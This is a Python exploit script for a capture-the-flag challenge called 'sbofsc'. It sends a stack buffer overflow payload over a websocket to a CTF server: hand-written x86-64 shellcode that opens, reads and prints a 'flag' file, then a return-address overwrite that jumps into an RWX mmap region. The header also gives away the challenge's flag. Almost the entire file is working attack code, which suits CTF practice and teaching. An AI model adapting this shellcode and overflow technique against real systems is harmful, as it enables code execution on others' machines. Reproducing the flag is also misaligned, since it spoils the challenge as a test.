#!/usr/bin/env python3
"""
sbofsc 最终 Exploit
题目：Stack Buffer Overflow + RWX mmap ShellCode
Flag: AAA{rET_To_9ueSS_Sh31LcOdE_p0sb6873e8f91eb}
"""
import websocket, time, struct

URL = 'wss://ctf.zjusec.net/api/proxy/019f5675-db8b-7bc1-94d5-2388e3fd6696'
p64 = lambda x: struct.pack('<Q', x)

# ========== Shellcode: open("flag")→read→write(1)→exit ==========
SC = bytes([
    0x31,0xc0,0x50,                      # xor eax,eax; push 0
    0x68,0x66,0x6c,0x61,0x67,           # push "flag"
    0x54,0x5f,                          # push rsp; pop rdi → rdi = "flag"
    0x31,0xf6,0x31,0xd2,                # xor esi,esi; xor edx,edx
    0x6a,0x02,0x58,0x0f,0x05,           # open("flag", O_RDONLY)
    0x48,0x89,0xc7,                     # mov rdi, rax (fd)
    0x48,0x89,0xe6,                     # mov rsi, rsp (buf)
    0x68,0x80,0x00,0x00,0x00,0x5a,      # push 128; pop rdx (size)
    0x31,0xc0,0x0f,0x05,                # read(fd, buf, 128)
    0x48,0x89,0xc2,                     # mov rdx, rax (bytes read)
    0x6a,0x01,0x5f,                     # push 1; pop rdi (stdout)
    0x48,0x89,0xe6,                     # mov rsi, rsp (buf)
    0x6a,0x01,0x58,0x0f,0x05,          # write(1, buf, n)
    0x31,0xff,0x6a,0x3c,0x58,0x0f,0x05 # exit(0)
])

def exploit():
    ws = websocket.create_connection(URL, timeout=10)
    ws.settimeout(3)
    
    # 收 banner
    try: banner = ws.recv()
    except: banner = b''
    print(f'[+] Banner: {banner!r}')
    
    # MRND=2 → mmap_addr = (2+32)*4096 = 0x22000
    payload = SC.ljust(64, b'\x90')
    payload += b'A' * 0x48               # 0x40 buffer + 8 rbp
    payload += p64(0x4012ca)             # ret sled（栈对齐）
    payload += p64(0x22000)              # → mmap RWX 区域
    payload += b'\n'
    
    ws.send(payload, websocket.ABNF.OPCODE_BINARY)
    time.sleep(1.5)
    
    # 收 flag
    ws.settimeout(3)
    result = b''
    while True:
        try:
            d = ws.recv()
            if d: result += d
            else: break
        except:
            break
    
    print(f'[+] Result: {result}')
    # 从输出中提取 flag
    for line in result.split(b'\n'):
        line = line.strip()
        if b'AAA{' in line:
            print(f'\n[!!!] FLAG: {line.decode()}')
    
    ws.close()

if __name__ == '__main__':
    exploit()
